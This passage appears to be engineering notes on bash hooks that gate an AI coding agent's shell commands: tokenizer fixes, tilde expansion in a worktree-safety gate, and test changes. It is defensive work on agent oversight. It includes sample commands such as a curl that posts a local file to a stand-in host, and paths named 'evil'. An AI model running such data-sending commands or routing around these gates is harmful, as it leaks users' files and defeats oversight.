The obvious route is a live `shlex.shlex` instance with `whitespace_split=True`, reading
`instream.tell()` around each `get_token()` to learn whether two tokens were adjacent. It
was measured and it cannot work: `tell()` reports ADJACENT for both `cp x "$HOME"/y` and
`cp x "$HOME" /y`, so shlex's own state does not separate a glued word from two words. The
information only exists in the original string.

### The signature takes TWO arguments, and that is forced rather than preferred

A one-argument `split_words(text)` would have to call `shlex.split` itself. The shared
block may not: it is pasted inline into both Bash hooks, it has to load under `python -S`,
and `tests/test_bash_control_operator_split.py::TestTheMirrorBlockNeedsNoImports` fails any
mirror block holding a line that starts with `import ` or `from `, as well as any block
that does not exec in an EMPTY namespace. So `shlex` stays at the two call sites and the
shared helper takes the one extra thing the algorithm genuinely needs.

`text` is the string HANDED TO shlex, which is `split_commands(cmd)` and NOT the raw
command. `split_commands` rewrites every unquoted newline into a spaced SEP sentinel, so
token offsets are offsets into the REWRITTEN text; passing `cmd` would fail every lookup on
a multi-line command, the fail-safe would return the list unchanged, and the repair would
silently do nothing on exactly the commands the newline cycle exists for. Both call sites
therefore bind the rewritten string to a local and use that local twice.

### `dequote` moved into the mirror, and the move is PART of the fix

Landing the rejoin alone is not a partial fix, it is a trade of one defect for two. Merging
moves quote characters INTO tokens that other consumers hand to `dequote`, and the
matched-OUTER-pair rule both hooks carried (`t[0] == t[-1] and t[0] in ("'", '"')`) then
leaves them on, because the merged token no longer ends with a quote:

* `host_of` starts `s = dequote(raw).strip()`. With the rejoin and the old rule,
  `curl -d @src/a.txt "https://example.invalid"/p` resolves the host
  `example.invalid"`, with a trailing quote. An allowlisted host stops matching and turns
  into a false ask.
* `positionals()` in the worktree hook calls `dequote(args[i])`. With the rejoin and the
  old rule, `git worktree add "scratch"/x main` records `"scratch"/x`, quotes and all,
  which is both a wrong gitignore question and a wrong audit row.

So `dequote` became a quote-state WALK (remove quote characters wherever they appear, no
expansion) and moved into the mirror block, where the existing tests hold the three copies
identical. It KEEPS its name, which is load-bearing rather than cosmetic:
`tests/test_bash_wrapper_prefix_gate.py` mutates the hook source on the literal string
`WRAPPER_POSITIONAL_SHAPES[name].match(dequote(seg[i]))`, so a rename would make that
mutation detector fail its own precondition.

The old four-line local `dequote` in each hook was DELETED rather than left in place. Both
sat AFTER the mirror block and after the package import, so a leftover copy would win
silently and the hook would keep the old rule while every mirror test still passed. That
shadowing risk is pinned structurally (no `def dequote(` outside the marker span in either
hook) as well as behaviorally.

### Ordering: before the stripper, before the splitter

The rejoin runs on the RAW shlex output. `split_control_operators` only ever splits a token
FURTHER, so it cannot repair an adjacency, and running it first would leave the fragments
apart. It also UNDOES any control operator the rejoin re-glues: `echo x > "src/log.txt"; ls`
merges to `"src/log.txt";` and is immediately re-split into `"src/log.txt"` and `;`, because
a quoted span is never re-split. The token stream reaching the redirect loop is identical to
before this cycle. That invariant used to be credited to shlex alone in the test that owns
it, and the reason comment was corrected in place: the assertion still holds, but it now
holds because a merge is undone one step later, not because nothing touched it.

`strip_heredoc_bodies` is unaffected: the SEP sentinel is emitted space-padded, so it can
never be merged into a neighbour, and the glued opener `<<'EOF'>f` is ALREADY one token
because it starts unquoted and absorbs. The disclosed glued-opener residue is therefore
unchanged in both direction and value.

### Trade accepted: a fail-safe that declines rather than guesses

A wrong merge is worse than the defect it repairs, so if a token is not found at or after
the cursor, or a gap holds anything other than whitespace, the ORIGINAL list is returned and
NOTHING is merged. The failure mode is the defect this cycle fixes, never a token stream
that says something the shell never said.

### Deliberately NOT done

Switching either hook to `posix=True` would fix the adjacency for free. It is declined
because posix mode performs quote removal, which destroys the quoting evidence that
`expand_word` and the mention-versus-use tests depend on: `"$HOME/x"` and `'$HOME/x'` are
the same bytes after quote removal and have OPPOSITE correct answers, and a quoted mention
of an operator would become an operator. The `foo>bar` limit (an operator glued to the verb
IN FRONT of it) has no boundary to recover and is untouched, as is the heredoc residue.

### Two defects the DOCUMENTATION of this fix caused, both found by running it

Both are the same shape and worth recording together: a guard that reads TEXT cannot tell
a description of a thing from the thing, and the one document most likely to describe the
raw call is the docstring of the function that repairs it.

**The import-prefix detector.** The planned `rejoin_glued_words` docstring word-wrapped so
that one line began with the word `import`, which trips
`test_the_block_contains_no_import_statement`: that detector reads line PREFIXES, so it
cannot separate an import statement from an English sentence that happens to start with
the word. The prose was re-wrapped (same words) rather than the detector loosened, and the
docstring now says so at the point of the wrap, because the next person to reflow that
paragraph will otherwise rediscover it by going red.

**The raw-call population read False on its own documentation.**
`bash_token_split_sites()` in `tests/_inventory.py` blanks whole-line `#` comments and
then looks for `shlex.split(` per line. The new docstring SHOWS the raw call three times,
as python string data rather than as comments, so the blanking did not reach it and BOTH
hooks read False while both real call sites were correctly wrapped. The derivation's own
stated rule is "a mention is not a call"; its predicate simply did not implement that rule
for prose written inside a string.

The fix brings `_bts_verdict` up to the standard its sibling `python_shlex_split_callers`
already set, which reads through `ast` "so the call SHAPE is what counts": each
`python3 <<'PY'` heredoc body is extracted and parsed, every string literal becomes a
PROSE span, and a match inside one is a mention. It FAILS CLOSED at every uncertainty, a
body that does not parse contributes no spans, so its matches count as calls and the
script reads False, because a guard that cannot tell must demand a look rather than pass
quietly.

**The obvious fix was rejected on a MEASUREMENT, and the measurement is the point.** The
tempting repair is to skip the `MIRROR BEGIN/END` span, justified by the block's
zero-import contract: if the block cannot import shlex, nothing inside it can call
shlex.split, so anything matching there must be prose. That argument is TRUE for the
standalone module `writ/session/bash_tokens.py` and FALSE for the two pasted hook copies.
In `writ-bash-write-gate.sh` the heredoc opens at line 1166, its first line is
`import os, re, shlex, sys`, and the mirror span runs from 1284 to 1787 INSIDE that same
program, so `shlex` is in scope there at runtime. Planting
`return shlex.split(text, posix=False)` between the markers was executed: the body still
parses, the prose spans are unchanged at 628 lines, and the verdict flips True to False
purely by detection. Skipping the span would have traded a false POSITIVE that is loud for
a blind spot that is silent, and that mutation is now pinned as a test.

### Measured versus inferred

MEASURED: the ten-row splitting table above, re-run at implementation time and matching the
plan's prediction on every row including the two that decide the algorithm; the three
consequence rows through the real extractor, each compared against a real `bash -c` oracle
rather than a hand-written expected string; the credential deny through the real hook; the
egress host and the worktree path through their own real callers, with the worktree hook's
quoted spelling producing a reason string BYTE-IDENTICAL to the unquoted control spelling;
and the `shlex`-in-scope finding that rejected the mirror-span exclusion, executed as a
planted call rather than argued from the zero-import contract.

ONE TEST WAS REPLACED RATHER THAN SATISFIED, disclosed because a deleted assertion is the
easiest thing to hide. The worktree case asserted that no `'` appeared in the reason before
the word `gitignore`. That is unsatisfiable on ANY tree, defect or none, because the hook's
own message wraps the path in single quotes as ordinary English prose
(`target 'scratch/x' is not matched`): it failed identically on the correct implementation
and was therefore blind to the property named above it. It is replaced by a PARITY
assertion, that the quoted spelling and the unquoted `git worktree add scratch/x main`
produce byte-identical output through the same helper, which is the claim the fix actually
makes and which reddens if either the rejoin or the corrected dequote is dropped.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
the same boundary every earlier cycle in this family recorded.

## Amendment (cycle W): the worktree hook's own tilde, and the promotion cycle T deferred

Ninth instance of the seam, and the FIRST one this family fixed by REUSE rather than by
authoring. Cycle T recorded two defects as "RECORDED, not fixed"; this cycle closes the
first of them, and closes it with cycle T's own text.

### The defect, and why it is worse than the one cycle T fixed

`hooks/scripts/writ-worktree-safety.sh` classified with `abs_target =
os.path.abspath(target)`. `abspath` normalizes and joins against the cwd; it does not
expand `~`. MEASURED against the real extractor, `git worktree add ~/evil evil-branch`
produced:

    deny   ~/evil   ENF-PROC-WORKTREE-001: project-local worktree target '~/evil' is not
    matched by any .gitignore entry. Add '~/' to .gitignore before creating the worktree.

The bash oracle for the same word, `bash -c 'printf "%s\n" ~/evil'`, answers
`$HOME/evil`, OUTSIDE the repo. So the verdict is a false refusal AND its remedy is
impossible: gitignoring `~/` cannot affect a directory that was never inside the project.
Cycle T's defect was a false ALLOW; this one is a false REFUSE whose advice cannot work,
and a governance tool that hands out nonsense advice teaches the agent to route around
guards. That habit outlives the bug.

### The promotion, and why `expand_word` needed its own home and its own markers

Cycle T wrote: "Adding it when the second caller exists is one edit; adding it now is churn
plus a speculative abstraction." This cycle is that second caller, and the edit was not
quite one, for two reasons verified rather than assumed:

1. `expand_word` existed in exactly ONE place, inline python text inside the quoted heredoc
   of `writ-bash-write-gate.sh`. It was in no importable module, so the worktree hook could
   not import it.
2. It may NOT join the MIRROR block. `tests/test_bash_expansion_boundary_gate.py`'s
   `TestExpandWordDoesNotLiveInTheMirrorBlock` fails if any part of it sits between the
   MIRROR markers, and `tests/test_bash_control_operator_split.py` execs that block in an
   EMPTY namespace and rejects any import statement inside it. `expand_word` needs `os`,
   `re` and `pwd`, so it cannot satisfy that contract.

So the canonical text moved to a NEW module, `writ/session/bash_expand.py`, under a NEW
marker family, `# EXPAND BEGIN expand_word` / `# EXPAND END expand_word`, with three
byte-identical copies (the module plus an inline copy in each gate) and a package rebind
after each inline copy. NOT into `writ/session/bash_tokens.py`: that module's docstring
states a zero-import contract that `tests/_inventory.py` cites when it explains why the
mirror span is not excluded from its shlex guard, and an `os`/`re`/`pwd` importing function
there would falsify a contract other guards lean on. The new module imports
`strip_unbalanced_close` from `bash_tokens`, one direction only.

The population is DERIVED, not a three-file tuple:
`tests/_inventory.py::expand_word_copy_sites()` scans `writ/`, `hooks/`, `bin/` and
`scripts/` for the BEGIN marker, so a fourth pasted copy fails BY NAME.

ONE comment inside the shared function changed, and it is the only behavior-bearing edit to
the write gate: the line reading "disclosed residue in the header's UNEXPANDED FORMS block"
was true of the write gate alone and is now "disclosed residue in each caller's own
unexpanded-forms header block". The file-specific prose ABOVE the regexes stays outside the
markers in each file, which is what lets three copies be byte-identical while each caller
explains itself in its own voice.

### The seam, again: `positionals()` had to stop dequoting

`positionals()` returned `dequote(args[i])`. By the time the target was chosen, `"~/x"` and
`~/x` were the SAME FOUR BYTES with OPPOSITE correct answers, so expansion placed after it
is wrong in one direction BY CONSTRUCTION. This is cycle T's "quoting does not survive to
the classification point" finding, in a second file. The function now returns RAW tokens;
flag detection keeps the dequoted view (it asks what a token SAYS); the caller dequotes the
two subcommand words and EXPANDS the path.

### The three directory-stack tildes: ASK here, and why that is not a divergence from cycle T

Cycle T argued `~+` is `$PWD`, which IS that hook's own cwd, "so expanding it or not gives
the same classification and there is nothing to close". For the worktree hook the
CLASSIFICATION is indeed the same (project-local either way) but the REMEDY is not: literal
`~+/evil` yields "add `~+/` to .gitignore" for a directory bash creates at `$PWD/evil`.
That is the same impossible-remedy defect in miniature. Widening `expand_word` to resolve
`~+` would change a SHARED text and therefore the write gate's behavior, which this cycle
has no oracle for, so the answer is an ASK, not a unilateral widening. Cycle T's own
precedent decides it: "the safe answer to 'cannot be trusted' is the prompt, not silence."
`~+`, `~-`, `~N` and an unresolved simple-name parameter in the FIRST path segment all ask,
naming the form and the way out. The test is on the first segment ONLY, because `top` is
the only thing the gitignore question is asked about: `scratch/$NOPE/x` still DENIES naming
`scratch/`. `unresolved` is computed INSIDE `expand_word`, where quoting still exists, so
the legitimately literal `'$NOPE/x'` never raises it. The hook's header carries an
`UNRESOLVED FORMS BEGIN/END` block, a marker name deliberately distinct from the write
gate's `UNEXPANDED FORMS`, so the two ratchets cannot be conflated, and a test derives the
expected names from the ask population itself.

### The test that was replaced, disclosed because a deleted assertion is easy to hide

`TestWorktreeHookBlindnessIsRecordedNotFixed` pinned TODAY's broken verdict and its
docstring instructed the next cycle to update it when the real fix landed. It was REPLACED,
not deleted, by `TestWorktreeHookAgreesWithTheShellOnTilde` in the same file: for every
spelling, the real hook and a real `bash` oracle are asked the same question under the SAME
cwd and env, and the hook must deny only when the oracle's answer lands inside the repo
root. No spelling carries a hardcoded verdict. The non-vacuity proof that this is not a
blanket loosening is the repo-root-IS-HOME case: with `HOME` set to the project, the SAME
`git worktree add ~/evil evil-branch` resolves INSIDE the repo and DENIES naming `evil/`, a
remedy that works. Expansion moves the verdict in BOTH directions and both now agree with
the shell.

### Measured versus inferred

MEASURED: the false refusal and its exact reason string through the real extractor; the
bash oracle for every spelling in the population, computed at run time under the hook's own
cwd and env; the post-fix verdicts through the real hook
(`tests/test_bash_expansion_boundary_gate.py` 95 -> 132 passed, 37 -> 0 failed, with the
pre-fix redness of the replacement measured BEFORE the fix landed); the three EXPAND copies
byte-identical and computing identical `(value, unresolved)` pairs over a shared spelling
table; the `ask` arm exercised as a real subprocess refusal with its audit row read back as
`ask` and never as `allow`; and `tests/firedrill` held at 103 passed.

NOT MEASURED, stated plainly: a worktree actually CREATED through the full Claude Code
path, the same boundary every earlier cycle in this family recorded. The `~N` oracle is
asked without a real directory stack, so the ask arm is proved on the FORM, not on a stack
this hook could never see anyway.

### Still recorded, not fixed

Cycle T's SECOND defect (a quote-then-unquoted word arriving as two tokens) was closed by
cycle V in the write gate's tokenizer. What remains open from this family is unchanged by
this cycle: telemetry for out-of-project worktree targets (that branch has NEVER emitted a
row; `git worktree add /tmp/x` is silent today and `~/evil` now joins that silent class),
and resolving the repo root through git rather than through the hook's cwd.

### One thing the promotion broke that was not behaviour, and is worth the paragraph

Promoting `expand_word` disarmed a mutation proof in a file this cycle's plan never named.
`tests/test_bash_group_construct_gate.py::TestTheFixIsConditional` mutates
`strip_unbalanced_close(raw)`, which occurs TWICE in the write gate's extractor: at the head
of the classification loop, and inside `expand_word`. Once the rebind existed, the mutated
inline `expand_word` was overwritten by the UNMUTATED package copy (`writ` is installed
editable in `.venv`, so the import resolves from any cwd), that copy still normalized the
unbalanced closer, and the classification loop's own mutated call had nothing left to do.
Two cells stopped reddening. MEASURED both ways before anything was repaired: with the
rebind neutralized, the same mutation reddens exactly as it always did.

Production behaviour did not change by one byte. What changed was the mutation's REACH, and
that is the trap worth naming: this was a green-to-red that is NOT a regression, and by the
same mechanism it could have been a red-to-green that is NOT a fix. The class docstring had
PREDICTED this hazard in the abstract ("a package import would rebind around an inert
mutation") back when `expand_word` was hook-local; this cycle made it real.

The repair strengthens the proof rather than retargeting it. The two affected tests
neutralize the rebind so the hook's OWN inline copy runs, which is both the text those
mutations were always meant to measure and a property nothing else in the suite asserted:
the inline fallback each hook carries for a failed package import must be load-bearing.
Each test proves that neutralization is itself conditional by running the UNMUTATED source
through it first and requiring the clean row, so one vacuous proof was not traded for
another. Retargeting the mutation to the classification-loop site alone was considered and
rejected: honest, but strictly less coverage than before the promotion.

THE GENERAL RULE, for the next cycle that promotes hook-local text to shared text: grep the
mutation targets of every conditionality proof in the suite for strings the promotion just
moved inside a rebound block.
